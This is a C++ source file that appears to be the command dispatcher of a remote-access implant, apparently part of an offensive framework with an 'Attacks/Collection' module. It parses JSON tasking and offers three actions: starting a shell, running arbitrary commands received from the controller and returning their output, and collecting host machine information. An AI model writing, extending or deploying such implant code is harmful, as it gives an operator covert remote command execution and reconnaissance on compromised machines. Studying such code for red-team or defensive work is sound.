#define NOMINMAX
#include "CommandHandler.h"

#include "Logger/GlobalLogger.h"
#include "serialization/MachineInfoSerializer.h"
#include <rapidjson/writer.h>
#include <rapidjson/stringbuffer.h>

#include "Attacks/Collection/sysinfo.hpp"

using namespace CppAgent;
using rapidjson::Document;
using rapidjson::Value;

CommandHandler::CommandHandler()
{
    registry_.emplace(StartShell,          &CommandHandler::onStartShell);
    registry_.emplace(RunCommand,          &CommandHandler::onRunCommand);
    registry_.emplace(GetBasicMachineInfo, &CommandHandler::onGetBasicMachineInfo);
}

std::string CommandHandler::handle(std::string_view reqJson)
{
    Document d;
    if (d.Parse(reqJson.data(), reqJson.size()).HasParseError() || !d.IsObject())
        return makeError("JSON parse error");

    int cmdId{};
    if (!json::getInt(d, "action_id", cmdId) && !json::getInt(d, "action", cmdId))
        return makeError("Missing action_id");

    auto it = registry_.find(cmdId);
    if (it == registry_.end())
        return makeError("Unknown action");

    try {
        return std::invoke(it->second, this, std::cref(d));
    } catch (const std::exception& ex) {
        DARKSCRY_LOG(ex.what(), Logger::Level::Error);
        return makeError(ex.what());
    }
}

std::string CommandHandler::onStartShell(const Document&)
{
#ifdef _WIN32
    if (!shell_) shell_ = std::make_unique<win32::Shell>();
    shellRunning_ = shell_->create_by_sid(L"CURRENT_USER");
#else
    if (!shell_) shell_ = std::make_unique<linux_os::Shell>();
    shellRunning_ = shell_->create();
#endif
    return shellRunning_ ? makeSuccess(Value(rapidjson::kNullType))
                         : makeError("Shell start failed");
}

std::string CommandHandler::onRunCommand(const Document& req)
{
    if (!shellRunning_)
        return makeError("Shell not running");

    std::string cmd;
    json::getString(req, "command", cmd);

    std::string out = shell_->run_command(cmd);
    Document d; d.SetObject();
    d.AddMember("output", Value(out.c_str(), d.GetAllocator()), d.GetAllocator());
    return makeSuccess(d);
}

std::string CommandHandler::onGetBasicMachineInfo(const Document&)
{
#ifdef _WIN32
    auto info = win32::sysinfo::get_basic_machine_info();
#else
    auto info = linux_os::sysinfo::get_basic_machine_info();
#endif

    Document tmp; tmp.SetObject();
    tmp.AddMember("machine_info", serialization::toJson(info, tmp.GetAllocator()), tmp.GetAllocator());
    return makeSuccess(tmp["machine_info"]);
}

std::string CommandHandler::makeSuccess(const Value& data)
{
    Document d; d.SetObject();
    auto& a = d.GetAllocator();
    d.AddMember("success", true, a);
    d.AddMember("data",    Value(data, a), a);
    d.AddMember("error",   Value(rapidjson::kNullType), a);

    rapidjson::StringBuffer buf;
    rapidjson::Writer<rapidjson::StringBuffer> wr(buf);
    d.Accept(wr);
    return buf.GetString();
}

std::string CommandHandler::makeError(const char* msg)
{
    Document d; d.SetObject();
    auto& a = d.GetAllocator();
    d.AddMember("success", false, a);
    d.AddMember("data",    Value(rapidjson::kNullType), a);
    d.AddMember("error",   Value(msg, a), a);

    rapidjson::StringBuffer buf;
    rapidjson::Writer<rapidjson::StringBuffer> wr(buf);
    d.Accept(wr);
    return buf.GetString();
}
